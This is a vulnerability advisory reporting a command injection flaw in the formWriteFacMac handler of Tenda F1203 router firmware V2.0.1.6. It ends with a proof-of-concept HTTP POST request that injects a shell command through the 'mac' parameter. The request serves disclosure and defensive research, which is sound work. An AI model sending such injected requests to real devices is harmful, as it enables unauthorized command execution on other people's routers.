# Tenda F1203 V2.0.1.6 was found to contain a command injection vulnerability in formWriteFacMac

## Description

`Tenda`  Router **F1203 V2.0.1.6** was found to contain a command injection vulnerability in `formWriteFacMac`.This vulnerability allows an attacker to execute arbitrary commands through the "mac" parameter.

## Firmware information

* Manufacturer's address: https://www.tenda.com.cn/

* Firmware download address : https://www.tenda.com.cn/download/detail-2494.html

## Affected version

![image-20221201234503984](images/01.png)

## Vulnerability details

This vulnerability lies in the `/goform/WriteFacMac` page，The details are shown below:

![image-20221202010903295](images/02.png)

## POC


```
POST /goform/WriteFacMac HTTP/1.1
Host: 192.168.204.143
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: user=admin
Connection: close
Content-Length: 4110

mac=00:01:02:11:22:33;echo%20hello
```
